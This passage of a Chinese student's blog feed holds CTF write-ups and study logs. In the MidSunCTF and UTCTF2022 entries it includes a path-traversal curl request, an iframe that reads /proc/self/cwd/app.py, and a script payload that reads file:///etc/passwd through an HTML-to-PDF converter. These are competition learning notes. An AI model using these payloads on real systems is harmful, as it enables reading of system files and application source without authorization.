joke.cgi</span><br><span class="line">curl http:<span class="regexp">//</span>retro-<span class="number">01</span>.hfsc.tf:<span class="number">8080</span><span class="regexp">/cgi-bin/</span>showimg.cgi\?<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/usr/</span>local<span class="regexp">/apache2/</span>cgi-bin<span class="regexp">/counter.cgi/</span>.gif -o counter.cgi</span><br></pre></td></tr></table></figure><p>之后对CGI文件进行分析（由于偷懒 没环境复现了 学习一下 LFI</p><p>留一个思考的问题 ： 如何判断一个端点容易受到文件包含的攻击</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;MidSunCTF&quot;&gt;&lt;a href=&quot;#MidSunCTF&quot; class=&quot;headerlink&quot; title=&quot;MidSunCTF&quot;&gt;&lt;/a&gt;MidSunCTF&lt;/h1&gt;&lt;p&gt;啥都没做出来  感觉这学期水平没啥长进  主要是精力有点分散了  不过路还很长 加油~&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>集成学习</title>
    <link href="http://example.com/2022/03/17/%E9%9B%86%E6%88%90%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2022/03/17/%E9%9B%86%E6%88%90%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-03-17T12:44:47.000Z</published>
    <updated>2022-04-13T10:39:32.591Z</updated>
    
    <content type="html"><![CDATA[<h1 id="路线"><a href="#路线" class="headerlink" title="路线"></a>路线</h1><p>不多bb 直接开学好吧 卷起来</p><span id="more"></span><p><a href="https://www.bilibili.com/video/BV1wF411e73j?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1wF411e73j?spm_id_from=333.337.search-card.all.click</a></p><p><a href="https://github.com/datawhalechina/ML-FTTI">https://github.com/datawhalechina/ML-FTTI</a></p><p><a href="https://datawhalechina.github.io/ML-FTTI/01_tree_ensemble/01_tree.html#id1">https://datawhalechina.github.io/ML-FTTI/01_tree_ensemble/01_tree.html#id1</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;路线&quot;&gt;&lt;a href=&quot;#路线&quot; class=&quot;headerlink&quot; title=&quot;路线&quot;&gt;&lt;/a&gt;路线&lt;/h1&gt;&lt;p&gt;不多bb 直接开学好吧 卷起来&lt;/p&gt;</summary>
    
    
    
    <category term="ML" scheme="http://example.com/categories/ML/"/>
    
    
    <category term="集成学习" scheme="http://example.com/tags/%E9%9B%86%E6%88%90%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>UTCTF2022</title>
    <link href="http://example.com/2022/03/14/UTCTF/"/>
    <id>http://example.com/2022/03/14/UTCTF/</id>
    <published>2022-03-14T02:30:15.000Z</published>
    <updated>2022-04-13T10:39:24.104Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UTCTF"><a href="#UTCTF" class="headerlink" title="UTCTF"></a>UTCTF</h1><p>我承认我这周摸鱼了 因为俄罗斯的游戏免费 2333  周一复现一下</p><span id="more"></span><p><img src="./UTCTF.assets/image-20220314110537531.png" alt="image-20220314110537531"></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Websockets"><a href="#Websockets" class="headerlink" title="Websockets"></a>Websockets</h3><p>看一下这个什么意思</p><blockquote><p>Can you hack my website?</p><p>By Daniel Parks (@danielp on discord)</p><p><a href="http://web1.utctf.live:8651/">http://web1.utctf.live:8651</a></p></blockquote><p>别的师傅做的</p><p>看一下包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/internal/ws</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web1.utctf.live:8651</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://web1.utctf.live:8651</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span><span class="punctuation">: </span>Mn6BDybVn/BJ5iCDpZ9JSw==</span><br></pre></td></tr></table></figure><p>建立socket连接后 爆破</p><p><a href="https://ctftime.org/writeup/32495">CTFtime.org / UTCTF 2022 / Websockets / Writeup</a></p><h3 id="HTML2PDF"><a href="#HTML2PDF" class="headerlink" title="HTML2PDF"></a>HTML2PDF</h3><blockquote><p>My friend bet me I couldn’t pwn this site. Can you help me break in?</p><p><em>by mattyp</em></p><p><a href="http://web2.utctf.live:9854/">http://web2.utctf.live:9854</a></p></blockquote><p><img src="%5CUTCTF.assets%5Cimage-20220314104424213.png" alt="image-20220314104424213"></p><p>打开网站是个这样的页面 点submit后 会直接convert to pdf</p><p>可以用 iframe 直接读文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Try Me!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;/proc/self/cwd/app.py&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1600px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800px&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf">https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf</a></p><p>直接拿里面的payload打 就ok</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)&#125;;x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/passwd&quot;</span>);x.<span class="title function_">send</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ReReCaptcha"><a href="#ReReCaptcha" class="headerlink" title="ReReCaptcha"></a>ReReCaptcha</h3><blockquote><p>Just solve 1000 captchas. It’s super easy. By ggu (@ggu on discord)</p><p><a href="http://web1.utctf.live:7132/">http://web1.utctf.live:7132</a></p></blockquote><p>直接按像素提取 不是很出色</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.get(<span class="string">&#x27;http://web1.utctf.live:7132/&#x27;</span>)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line">soup = BeautifulSoup(res.text,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">img_data = soup.find(<span class="string">&#x27;img&#x27;</span>).get(<span class="string">&#x27;src&#x27;</span>).split(<span class="string">&quot;,&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">binary_img_data = base64.b64decode(img_data)</span><br><span class="line">file_like = BytesIO(binary_img_data)</span><br><span class="line">image = Image.<span class="built_in">open</span>(file_like)</span><br><span class="line"><span class="comment"># print(image.size)</span></span><br><span class="line"><span class="comment">#尝试者把中间那块直接分割出来</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Clipper</span>(<span class="params">image</span>):</span><br><span class="line">    img = image</span><br><span class="line">    width, height = img.size</span><br><span class="line">    <span class="comment"># print(width,height)</span></span><br><span class="line">    box = (<span class="number">15</span>,<span class="number">10</span>,<span class="number">410</span>, <span class="number">110</span>)</span><br><span class="line">    <span class="comment"># 前两个坐标点是左上角坐标</span></span><br><span class="line">    <span class="comment"># 后两个坐标点是右下角坐标</span></span><br><span class="line">    <span class="comment"># width在前， height在后</span></span><br><span class="line">    region = img.crop(box)</span><br><span class="line">    <span class="comment"># region.show()</span></span><br><span class="line">    <span class="keyword">return</span> region</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">region = Clipper(image)</span><br><span class="line">region.save(<span class="string">&quot;./abab.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接下来提取所有的黄（部分绿）像素点</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">imagepath = <span class="string">r&#x27;./abab.png&#x27;</span></span><br><span class="line">image = cv2.imread(imagepath)</span><br><span class="line">height, width, channel = image.shape</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        b, g, r = image[i, j]</span><br><span class="line">        <span class="keyword">if</span> ((r - b) &gt; <span class="number">210</span> <span class="keyword">and</span> (g - b) &gt; <span class="number">80</span>):  <span class="comment">#这里需要继续调一下</span></span><br><span class="line">            b = <span class="number">0</span></span><br><span class="line">            g = <span class="number">0</span></span><br><span class="line">            r = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b = <span class="number">255</span></span><br><span class="line">            g = <span class="number">255</span></span><br><span class="line">            r = <span class="number">255</span></span><br><span class="line"></span><br><span class="line">        image[i, j] = [r, g, b]</span><br><span class="line">plt.figure(figsize=(<span class="number">20</span>, <span class="number">10</span>))</span><br><span class="line">plt.imshow(image)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>二值化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 图片二值化</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;./abab.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模式L”为灰色图像，它的每个像素用8个bit表示，0表示黑，255表示白，其他数字表示不同的灰度。</span></span><br><span class="line">Img = img.convert(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">Img.save(<span class="string">&quot;./ab.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义灰度界限，大于这个值为黑色，小于这个值为白色</span></span><br><span class="line">threshold = <span class="number">123</span></span><br><span class="line"></span><br><span class="line">table = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt; threshold:</span><br><span class="line">        table.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table.append(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 图片二值化</span></span><br><span class="line">photo = Img.point(table, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">photo.save(<span class="string">&quot;./ababab.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">photo.show()</span><br></pre></td></tr></table></figure><p>一般</p><p>我想:</p><p>他这个像素值只有固定几种 不知道能不能找出加密算法 emmm</p><p>然后去摸鱼了 emmm</p><p><a href="https://ctftime.org/writeup/32555">CTFtime.org / UTCTF 2022 / ReReCaptcha / Writeup</a></p><p>参考了下别人的wp  主要是在大量图片中提取出现次数最多的像素来获取背景图片 然后xor  gg</p><h3 id="Sigma"><a href="#Sigma" class="headerlink" title="Sigma"></a>Sigma</h3><blockquote><p>Our new image processing tool runs completely in your browser! Right now we only support one image effect and image format though.</p><p>Note: this challenge is also a reversing challenge.</p><p>By ggu (@ggu on discord)</p><p><a href="http://web2.utctf.live:5006/">http://web2.utctf.live:5006</a></p><p><a href="https://utctf.live/files/2382cf3e8bce7c5ae20c7900e44888b5/server.zip?token=eyJ1c2VyX2lkIjo2NCwidGVhbV9pZCI6MzcsImZpbGVfaWQiOjEyfQ.YixQuA.zo685DLvS_VDoKICLHwN_4RyhQo"> server.zip</a></p></blockquote><p>猫哥yyds</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;UTCTF&quot;&gt;&lt;a href=&quot;#UTCTF&quot; class=&quot;headerlink&quot; title=&quot;UTCTF&quot;&gt;&lt;/a&gt;UTCTF&lt;/h1&gt;&lt;p&gt;我承认我这周摸鱼了 因为俄罗斯的游戏免费 2333  周一复现一下&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>one-xss-challenge</title>
    <link href="http://example.com/2022/03/11/one-xss-challenge/"/>
    <id>http://example.com/2022/03/11/one-xss-challenge/</id>
    <published>2022-03-11T14:22:51.000Z</published>
    <updated>2022-04-27T16:46:29.745Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="07ebcd97bf1c78c2caa3959a8b844080d50516b839e83b0b73900c36b2e34bba"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>learn-month1</title>
    <link href="http://example.com/2022/03/11/learn-month1/"/>
    <id>http://example.com/2022/03/11/learn-month1/</id>
    <published>2022-03-11T13:23:48.000Z</published>
    <updated>2022-04-14T08:11:18.868Z</updated>
    
    <content type="html"><![CDATA[<h1 id="learn-month1"><a href="#learn-month1" class="headerlink" title="learn-month1"></a>learn-month1</h1><p>第一月的学习记录  整合过来</p><span id="more"></span><h2 id="learn-day1"><a href="#learn-day1" class="headerlink" title="learn-day1"></a>learn-day1</h2><blockquote><p>本文为learn365第一篇 记录每日学习内容</p></blockquote><h3 id="done"><a href="#done" class="headerlink" title="done"></a>done</h3><p><a href="https://github.com/godrun666/team-learning-rl">godrun666/team-learning-rl (github.com)</a></p><p>datawhale的开源强化学习学习计划</p><p>15day</p><ul><li>今天开始Task1 目前把书读了 明天把code敲一敲</li><li>读了一篇论文的一部分 继续学习 attention</li><li>看一个xss （晚上搞   –<a href="https://terjanq.medium.com/how-to-solve-a-challenge-from-intigrity-in-under-60-minutes-6843ba9b9552">How to solve an XSS challenge from Intigriti in under 60 minutes | by terjanq | Medium</a></li><li>雅思单词+ted*1</li></ul><blockquote><h6 id="Task1：强化学习基础（2天）"><a href="#Task1：强化学习基础（2天）" class="headerlink" title="Task1：强化学习基础（2天）"></a>Task1：强化学习基础（2天）</h6><ul><li>了解强化学习的基本概念；</li><li>掌握 Gym 的使用；</li><li>对应教程的第一章。</li></ul></blockquote><p>由于要参加datawhale的15day计划 可能强化学习要拖到三月底到四月初来解决了</p><h3 id="记录一些杂事"><a href="#记录一些杂事" class="headerlink" title="记录一些杂事"></a>记录一些杂事</h3><ul><li>和导师谈了谈 确定了srtp的方向 准备入手了</li><li>明天有UTCTF 看看web题目</li><li>论文读起来很吃力 要想办法解决</li></ul><h2 id="learn2-amp-3"><a href="#learn2-amp-3" class="headerlink" title="learn2&amp;3"></a>learn2&amp;3</h2><p>周末没干啥大事 新到了手柄沉迷了一下 (鬼泣5真香)  看了看UTCTF的web</p><p>摸鱼 0.0</p><h2 id="learn4"><a href="#learn4" class="headerlink" title="learn4"></a>learn4</h2><p>学习了 GNN 的基本原理</p><p>发现宝藏网站</p><p><a href="https://distill.pub/">Distill — Latest articles about machine learning</a></p><p>好视频</p><p><a href="https://www.bilibili.com/video/BV1H44y1t75x?spm_id_from=333.999.0.0">如何读论文【论文精读】_哔哩哔哩_bilibili</a></p><h2 id="learn5-7"><a href="#learn5-7" class="headerlink" title="learn5~7"></a>learn5~7</h2><h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p><a href="https://terjanq.medium.com/massive-xs-search-over-multiple-google-products-416e50dd2ec6">https://terjanq.medium.com/massive-xs-search-over-multiple-google-products-416e50dd2ec6</a></p><p><a href="https://medium.com/@takshalpentester/how-i-was-able-to-find-50-cross-site-scripting-xss-security-vulnerabilities-on-bugcrowd-public-ba33db2b0ab1">https://medium.com/@takshalpentester/how-i-was-able-to-find-50-cross-site-scripting-xss-security-vulnerabilities-on-bugcrowd-public-ba33db2b0ab1</a></p><h3 id="done-1"><a href="#done-1" class="headerlink" title="done"></a>done</h3><ul><li><p>实践了一丢丢xss</p></li><li><p>看了部分动手学深度学习</p></li><li><p>读了点论文</p></li></ul><h3 id="fail-to-do"><a href="#fail-to-do" class="headerlink" title="fail to do"></a>fail to do</h3><p>AST injection 没完全搞明白 。。。失败</p><h2 id="learn6-8"><a href="#learn6-8" class="headerlink" title="learn6~8"></a>learn6~8</h2><h3 id="source-1"><a href="#source-1" class="headerlink" title="source"></a>source</h3><p><a href="https://terjanq.medium.com/massive-xs-search-over-multiple-google-products-416e50dd2ec6">https://terjanq.medium.com/massive-xs-search-over-multiple-google-products-416e50dd2ec6</a></p><p><a href="https://medium.com/@takshalpentester/how-i-was-able-to-find-50-cross-site-scripting-xss-security-vulnerabilities-on-bugcrowd-public-ba33db2b0ab1">https://medium.com/@takshalpentester/how-i-was-able-to-find-50-cross-site-scripting-xss-security-vulnerabilities-on-bugcrowd-public-ba33db2b0ab1</a></p><h3 id="done-2"><a href="#done-2" class="headerlink" title="done"></a>done</h3><ul><li><p>学会了 auto AI 2333</p></li><li><p>实践了一丢丢xss</p></li><li><p>看了部分动手学深度学习</p></li><li><p>读了点论文</p></li></ul><h3 id="fail-to-do-1"><a href="#fail-to-do-1" class="headerlink" title="fail to do"></a>fail to do</h3><p>AST injection 没完全搞明白 。。。失败</p><h3 id="plan"><a href="#plan" class="headerlink" title="plan"></a>plan</h3><p>复现俩misc </p><p><a href="https://blog.maple3142.net/2022/02/07/dicectf-2022-writeups/#ti-1337-silver-edition">https://blog.maple3142.net/2022/02/07/dicectf-2022-writeups/#ti-1337-silver-edition</a></p><p>集成学习 实践一下</p><h2 id="很久没记录了-4-2"><a href="#很久没记录了-4-2" class="headerlink" title="很久没记录了 4.2"></a>很久没记录了 4.2</h2><p>最近比较开心的是被nus的 summer workshop 录取了</p><p>记录一手周末的学习记录</p><h2 id="work1"><a href="#work1" class="headerlink" title="work1"></a>work1</h2><p>先学一手datawhale的异常检测 </p><p><a href="https://www.bilibili.com/video/BV1tV411b7Ck">https://www.bilibili.com/video/BV1tV411b7Ck</a></p><h3 id="COPOD方法"><a href="#COPOD方法" class="headerlink" title="COPOD方法"></a>COPOD方法</h3><p><a href="https://zhuanlan.zhihu.com/p/338189299">https://zhuanlan.zhihu.com/p/338189299</a></p><h2 id="work2"><a href="#work2" class="headerlink" title="work2"></a>work2</h2><p>李宏毅的异常检测部分</p><h2 id="learn23-记录一下周末的学习"><a href="#learn23-记录一下周末的学习" class="headerlink" title="learn23-记录一下周末的学习"></a>learn23-记录一下周末的学习</h2><h3 id="midsunctf"><a href="#midsunctf" class="headerlink" title="midsunctf"></a>midsunctf</h3><p>看了一题web 没做出来（失败的我 可恶啊</p><h3 id="srtp"><a href="#srtp" class="headerlink" title="srtp"></a>srtp</h3><p>正在立项 讨论ing 希望不会挂</p><h3 id="LSTM学习"><a href="#LSTM学习" class="headerlink" title="LSTM学习"></a>LSTM学习</h3><p><a href="http://karpathy.github.io/2015/05/21/rnn-effectiveness/">http://karpathy.github.io/2015/05/21/rnn-effectiveness/</a></p><h3 id="kaggle竞赛事件-——-计划下周日前完成学习"><a href="#kaggle竞赛事件-——-计划下周日前完成学习" class="headerlink" title="kaggle竞赛事件  ——  计划下周日前完成学习"></a>kaggle竞赛事件  ——  计划下周日前完成学习</h3><p><a href="https://www.kaggle.com/c/web-traffic-time-series-forecasting">https://www.kaggle.com/c/web-traffic-time-series-forecasting</a></p><h3 id="找找英文课听"><a href="#找找英文课听" class="headerlink" title="找找英文课听"></a>找找英文课听</h3><p>为了summer workshop 不会在语言关上被 ko  555 ~</p><h2 id="learn31"><a href="#learn31" class="headerlink" title="learn31"></a>learn31</h2><p>小总结一下</p><p>最近上网课 实在是懈怠了 不知不觉 learn系列已经来到了31   每天坚持记录真的很难 </p><p>从现在开始   必须坚持每两天记录一次(at least)</p><h3 id="总结一下-4-10-4-11-周末"><a href="#总结一下-4-10-4-11-周末" class="headerlink" title="总结一下 4.10 ~ 4.11 周末"></a>总结一下 4.10 ~ 4.11 周末</h3><ul><li>看了PlaidCTF 没输出（ 周一 也就是今天 要复现一下 写成blog</li><li>srtp申请 仍在进行中</li><li>完成了几个作业</li></ul><h3 id="goals-4-11"><a href="#goals-4-11" class="headerlink" title="goals 4.11"></a>goals 4.11</h3><ul><li>开始学习 cs107e</li><li>复现PlaidCTF</li><li>数值分析作业 + 计组实验预习</li><li>听一节汇编的课</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;learn-month1&quot;&gt;&lt;a href=&quot;#learn-month1&quot; class=&quot;headerlink&quot; title=&quot;learn-month1&quot;&gt;&lt;/a&gt;learn-month1&lt;/h1&gt;&lt;p&gt;第一月的学习记录  整合过来&lt;/p&gt;</summary>
    
    
    
    <category term="learn" scheme="http://example.com/categories/learn/"/>
    
    
    <category term="learn365" scheme="http://example.com/tags/learn365/"/>
    
  </entry>
  
</feed>
